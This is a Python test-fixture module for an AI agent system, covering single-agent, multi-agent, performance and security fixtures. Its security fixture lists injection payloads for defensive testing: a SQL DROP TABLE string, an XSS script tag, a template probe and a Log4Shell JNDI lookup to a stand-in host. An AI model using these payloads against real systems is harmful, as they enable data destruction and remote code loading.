"""
Test Fixtures Manager for AI Agent Testing

This module provides comprehensive test fixture management including
test data creation, state management, and cleanup utilities.
"""

import asyncio
import json
import logging
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest

from .test_data_manager import QueryType, TestDataManager


@dataclass
class TestFixture:
    """Represents a test fixture with data and metadata"""

    name: str
    data: Any
    fixture_type: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    cleanup_required: bool = False
    dependencies: List[str] = field(default_factory=list)


@dataclass
class AgentTestData:
    """Test data specific to agent testing"""

    agent_id: str
    test_queries: List[str]
    expected_responses: List[str]
    expected_tools: List[str]
    context: Dict[str, Any] = field(default_factory=dict)
    performance_thresholds: Dict[str, float] = field(default_factory=dict)


@dataclass
class MultiAgentTestData:
    """Test data for multi-agent coordination testing"""

    scenario_name: str
    agents: List[str]
    conversation_flow: List[Dict[str, Any]]
    expected_delegations: List[Dict[str, str]]
    success_criteria: Dict[str, Any] = field(default_factory=dict)


class TestFixtureManager:
    """
    Comprehensive test fixture manager for AI agent testing.

    Provides:
    - Test data creation and management
    - Fixture lifecycle management
    - State isolation between tests
    - Cleanup utilities
    """

    def __init__(self, temp_dir: Optional[Path] = None):
        self.logger = logging.getLogger("test_fixture_manager")
        self.temp_dir = temp_dir or Path(tempfile.mkdtemp(prefix="vana_fixtures_"))
        self.fixtures: Dict[str, TestFixture] = {}
        self.active_fixtures: set = set()
        self.cleanup_tasks: List[asyncio.Task] = []

        # Initialize test data manager
        self.test_data_manager = TestDataManager()

        # Create fixture directories
        self._create_fixture_directories()

    def _create_fixture_directories(self):
        """Create necessary directories for fixtures"""
        directories = [
            "agent_data",
            "multi_agent_data",
            "performance_data",
            "security_data",
            "temp_files",
            "logs",
        ]

        for dir_name in directories:
            (self.temp_dir / dir_name).mkdir(exist_ok=True)

        self.logger.info(f"Created fixture directories in: {self.temp_dir}")

    def create_agent_test_fixture(
        self,
        agent_id: str,
        query_type: QueryType = QueryType.FACTUAL,
        num_queries: int = 5,
    ) -> TestFixture:
        """Create test fixture for single agent testing"""

        # Load test scenarios
        scenarios = self.test_data_manager.load_scenarios_by_type(query_type)
        selected_scenarios = scenarios[:num_queries]

        # Create agent test data
        agent_data = AgentTestData(
            agent_id=agent_id,
            test_queries=[s.query for s in selected_scenarios],
            expected_responses=[s.expected_pattern for s in selected_scenarios],
            expected_tools=[s.expected_tools[0] if s.expected_tools else "echo" for s in selected_scenarios],
            context={"query_type": query_type.value, "test_mode": True},
            performance_thresholds={
                "response_time": 5.0,
                "accuracy_threshold": 0.8,
                "tool_usage_accuracy": 0.9,
            },
        )

        # Create fixture
        fixture_name = f"agent_{agent_id}_{query_type.value}"
        fixture = TestFixture(
            name=fixture_name,
            data=agent_data,
            fixture_type="agent_test",
            metadata={
                "agent_id": agent_id,
                "query_type": query_type.value,
                "num_queries": num_queries,
                "created_at": asyncio.get_event_loop().time(),
            },
            cleanup_required=False,
        )

        self.fixtures[fixture_name] = fixture
        self.logger.info(f"Created agent test fixture: {fixture_name}")
        return fixture

    def create_multi_agent_test_fixture(
        self,
        scenario_name: str,
        agents: List[str],
        conversation_type: str = "coordination",
    ) -> TestFixture:
        """Create test fixture for multi-agent coordination testing"""

        # Define conversation flows based on type
        conversation_flows = {
            "coordination": [
                {
                    "from": "user",
                    "to": agents[0],
                    "message": "Please coordinate with other agents to solve this task",
                },
                {
                    "from": agents[0],
                    "to": agents[1],
                    "message": "I need your expertise for this task",
                },
                {
                    "from": agents[1],
                    "to": agents[0],
                    "message": "Here's my analysis and recommendations",
                },
                {
                    "from": agents[0],
                    "to": "user",
                    "message": "Task completed with coordination",
                },
            ],
            "delegation": [
                {
                    "from": "user",
                    "to": agents[0],
                    "message": "Please handle this complex request",
                },
                {
                    "from": agents[0],
                    "to": agents[1],
                    "message": "Delegating specialized task to you",
                },
                {
                    "from": agents[1],
                    "to": agents[0],
                    "message": "Task completed, here are the results",
                },
                {
                    "from": agents[0],
                    "to": "user",
                    "message": "Request fulfilled through delegation",
                },
            ],
            "collaboration": [
                {
                    "from": "user",
                    "to": "all",
                    "message": "All agents please collaborate on this task",
                },
                {
                    "from": agents[0],
                    "to": "all",
                    "message": "I'll handle the initial analysis",
                },
                {
                    "from": agents[1],
                    "to": "all",
                    "message": "I'll provide technical implementation",
                },
                {
                    "from": "all",
                    "to": "user",
                    "message": "Collaborative task completed",
                },
            ],
        }

        # Create multi-agent test data
        multi_agent_data = MultiAgentTestData(
            scenario_name=scenario_name,
            agents=agents,
            conversation_flow=conversation_flows.get(conversation_type, conversation_flows["coordination"]),
            expected_delegations=[
                {"from": agents[0], "to": agents[1]},
                {"from": agents[1], "to": agents[0]},
            ],
            success_criteria={
                "all_agents_respond": True,
                "delegation_occurs": True,
                "task_completion": True,
                "response_coherence": 0.8,
            },
        )

        # Create fixture
        fixture_name = f"multi_agent_{scenario_name}_{conversation_type}"
        fixture = TestFixture(
            name=fixture_name,
            data=multi_agent_data,
            fixture_type="multi_agent_test",
            metadata={
                "scenario_name": scenario_name,
                "agents": agents,
                "conversation_type": conversation_type,
                "created_at": asyncio.get_event_loop().time(),
            },
            cleanup_required=False,
        )

        self.fixtures[fixture_name] = fixture
        self.logger.info(f"Created multi-agent test fixture: {fixture_name}")
        return fixture

    def create_performance_test_fixture(self, test_name: str, load_config: Dict[str, Any]) -> TestFixture:
        """Create test fixture for performance testing"""

        # Default performance test configuration
        default_config = {
            "concurrent_users": 10,
            "requests_per_user": 5,
            "ramp_up_time": 30,
            "test_duration": 300,
            "target_response_time": 2.0,
            "target_throughput": 100,
            "error_threshold": 0.05,
        }

        # Merge with provided config
        performance_config = {**default_config, **load_config}

        # Create fixture
        fixture_name = f"performance_{test_name}"
        fixture = TestFixture(
            name=fixture_name,
            data=performance_config,
            fixture_type="performance_test",
            metadata={
                "test_name": test_name,
                "created_at": asyncio.get_event_loop().time(),
            },
            cleanup_required=True,
        )

        self.fixtures[fixture_name] = fixture
        self.logger.info(f"Created performance test fixture: {fixture_name}")
        return fixture

    def create_security_test_fixture(self, test_name: str, security_scenarios: List[str]) -> TestFixture:
        """Create test fixture for security testing"""

        # Define security test scenarios
        security_data = {
            "injection_tests": [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}",
            ],
            "authentication_tests": [
                "Test with invalid API key",
                "Test with expired token",
                "Test with malformed credentials",
            ],
            "authorization_tests": [
                "Access restricted agent functions",
                "Attempt privilege escalation",
                "Cross-agent unauthorized access",
            ],
            "data_validation_tests": [
                "Oversized input data",
                "Malformed JSON payloads",
                "Invalid parameter types",
            ],
        }

        # Filter scenarios based on request
        filtered_data = {
            scenario: security_data[scenario] for scenario in security_scenarios if scenario in security_data
        }

        # Create fixture
        fixture_name = f"security_{test_name}"
        fixture = TestFixture(
            name=fixture_name,
            data=filtered_data,
            fixture_type="security_test",
            metadata={
                "test_name": test_name,
                "scenarios": security_scenarios,
                "created_at": asyncio.get_event_loop().time(),
            },
            cleanup_required=False,
        )

        self.fixtures[fixture_name] = fixture
        self.logger.info(f"Created security test fixture: {fixture_name}")
        return fixture

    def get_fixture(self, fixture_name: str) -> Optional[TestFixture]:
        """Get a specific test fixture"""
        return self.fixtures.get(fixture_name)

    def list_fixtures(self, fixture_type: Optional[str] = None) -> List[TestFixture]:
        """List all fixtures, optionally filtered by type"""
        if fixture_type:
            return [f for f in self.fixtures.values() if f.fixture_type == fixture_type]
        return list(self.fixtures.values())

    def activate_fixture(self, fixture_name: str):
        """Mark a fixture as active"""
        if fixture_name in self.fixtures:
            self.active_fixtures.add(fixture_name)
            self.logger.info(f"Activated fixture: {fixture_name}")

    def deactivate_fixture(self, fixture_name: str):
        """Mark a fixture as inactive"""
        self.active_fixtures.discard(fixture_name)
        self.logger.info(f"Deactivated fixture: {fixture_name}")

    async def cleanup_fixture(self, fixture_name: str):
        """Clean up a specific fixture"""
        if fixture_name not in self.fixtures:
            return

        fixture = self.fixtures[fixture_name]
        if fixture.cleanup_required:
            # Perform fixture-specific cleanup
            if fixture.fixture_type == "performance_test":
                # Clean up performance test artifacts
                perf_dir = self.temp_dir / "performance_data" / fixture_name
                if perf_dir.exists():
                    import shutil

                    shutil.rmtree(perf_dir, ignore_errors=True)

        # Remove from active fixtures
        self.deactivate_fixture(fixture_name)
        self.logger.info(f"Cleaned up fixture: {fixture_name}")

    async def cleanup_all_fixtures(self):
        """Clean up all fixtures"""
        for fixture_name in list(self.fixtures.keys()):
            await self.cleanup_fixture(fixture_name)

        # Clean up temp directory
        if self.temp_dir.exists():
            import shutil

            shutil.rmtree(self.temp_dir, ignore_errors=True)

        self.logger.info("Cleaned up all fixtures")

    def save_fixture_to_file(self, fixture_name: str, file_path: Optional[Path] = None):
        """Save fixture data to file for reuse"""
        if fixture_name not in self.fixtures:
            raise ValueError(f"Fixture not found: {fixture_name}")

        fixture = self.fixtures[fixture_name]

        if file_path is None:
            file_path = self.temp_dir / f"{fixture_name}.json"

        # Convert fixture to serializable format
        fixture_data = {
            "name": fixture.name,
            "fixture_type": fixture.fixture_type,
            "metadata": fixture.metadata,
            "data": self._serialize_fixture_data(fixture.data),
        }

        with open(file_path, "w") as f:
            json.dump(fixture_data, f, indent=2)

        self.logger.info(f"Saved fixture to file: {file_path}")

    def _serialize_fixture_data(self, data: Any) -> Any:
        """Convert fixture data to JSON-serializable format"""
        if hasattr(data, "__dict__"):
            return data.__dict__
        elif isinstance(data, dict):
            return {k: self._serialize_fixture_data(v) for k, v in data.items()}
        elif isinstance(data, list):
            return [self._serialize_fixture_data(item) for item in data]
        else:
            return data

    def get_manager_stats(self) -> Dict[str, Any]:
        """Get statistics about the fixture manager"""
        fixture_types = {}
        for fixture in self.fixtures.values():
            fixture_types[fixture.fixture_type] = fixture_types.get(fixture.fixture_type, 0) + 1

        return {
            "total_fixtures": len(self.fixtures),
            "active_fixtures": len(self.active_fixtures),
            "fixture_types": fixture_types,
            "temp_dir": str(self.temp_dir),
            "cleanup_tasks": len(self.cleanup_tasks),
        }


# Pytest fixtures for test fixture manager
@pytest.fixture
def fixture_manager():
    """Pytest fixture for test fixture manager"""
    manager = TestFixtureManager()
    try:
        yield manager
    finally:
        asyncio.run(manager.cleanup_all_fixtures())


@pytest.fixture
def agent_test_fixture(fixture_manager):
    """Pytest fixture for agent testing"""
    fixture = fixture_manager.create_agent_test_fixture("vana", QueryType.FACTUAL, 3)
    fixture_manager.activate_fixture(fixture.name)
    yield fixture
    asyncio.run(fixture_manager.cleanup_fixture(fixture.name))


@pytest.fixture
def multi_agent_test_fixture(fixture_manager):
    """Pytest fixture for multi-agent testing"""
    fixture = fixture_manager.create_multi_agent_test_fixture(
        "coordination_test", ["vana", "code_execution"], "coordination"
    )
    fixture_manager.activate_fixture(fixture.name)
    yield fixture
    asyncio.run(fixture_manager.cleanup_fixture(fixture.name))
